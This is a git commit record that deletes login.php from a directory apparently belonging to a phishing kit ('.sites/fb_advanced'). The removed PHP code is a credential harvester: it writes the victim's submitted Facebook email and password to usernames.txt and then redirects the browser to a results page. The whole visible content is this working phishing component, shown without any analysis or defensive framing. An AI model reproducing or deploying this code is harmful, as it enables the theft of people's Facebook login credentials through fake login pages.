ff09b5030e66477289bb51f20a011046cdfe7c94
ajay695 <72080374+ajay695@users.noreply.github.com>
2021-02-16 14:35:28 +0000

    Delete login.php

--- .sites/fb_advanced/login.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Facebook Username: " . $_POST['email'] . " Pass: " . $_POST['pass'] . "\n", FILE_APPEND);
-header('Location: ./result.html');
-exit();
-?>
